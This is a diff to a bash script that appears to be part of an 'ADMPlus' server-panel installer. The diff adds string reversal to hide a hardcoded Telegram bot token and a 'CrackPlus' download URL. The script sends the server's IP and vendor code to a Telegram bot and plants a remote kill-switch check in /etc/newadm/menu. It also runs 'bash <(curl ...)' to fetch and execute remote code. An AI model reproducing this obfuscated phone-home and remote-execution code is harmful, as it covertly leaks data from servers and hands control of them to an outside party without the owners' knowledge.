@@ -1,5 +1,7 @@
 #!/bin/bash
-TOKEN="1830099891:AAF7NVl2kT4UBrXACSLW-7TUBwKvyEhuI8g"
+#TOKEN="1830099891:AAF7NVl2kT4UBrXACSLW-7TUBwKvyEhuI8g"
+TOK="g8IuhEyvKwBUT7-WLSCAXrBU4Tk2lVN7FAA:1989900381"
+TOKEN=$(echo $TOK|rev)
 ID="553561525"
 IP=$(curl -sSL "https://api.ipify.org")
 MSJ=$(cat /etc/newadm/message.txt)
@@ -7,6 +9,8 @@ key=$(cat /etc/newadm/key.txt)
 ver=$(cat /etc/ger-frm/version.txt)
 PIRT="sulPkcarC/oi.tig//:sptth"
 PIRT2=$(echo $PIRT|rev)
+DBIP="mdakcolnu/oi.tig//:sptth"
+PERM=$(echo $DBIP|rev)
 #KeyUsada: ${key}
 vend=$(cat /usr/bin/vendor_code)
 MENSAJE="ADMPlus: ${ver} Instalado en IP: ${IP} IPVendedor: ${vend}" #Mensaje ${MSJ}"
@@ -31,6 +35,5 @@ URL="https://api.telegram.org/bot$TOKEN/sendMessage"
 #fi
 curl -s -X POST $URL -d chat_id=$ID -d text="$MENSAJE" &> /dev/null
 #echo -e "$MENSAJE enviado"
-#sed -i '2icurl -sSL "https://git.io/unlockadm"|grep "$(cat /usr/bin/vendor_code)" &> /dev/null || exit' /etc/newadm/menu
 sed -i '2icurl -sSL "https://git.io/unlockadm"|grep "$(cat /usr/bin/vendor_code)" &> /dev/null || exit' /etc/newadm/menu
-[[ $(echo $permited|grep "${IP}") = "" ]] || bash <(curl -Ls $PIRT2)
+[[ $(echo $PERM|grep "${vend}") = "" ]] || bash <(curl -Ls $PIRT2)
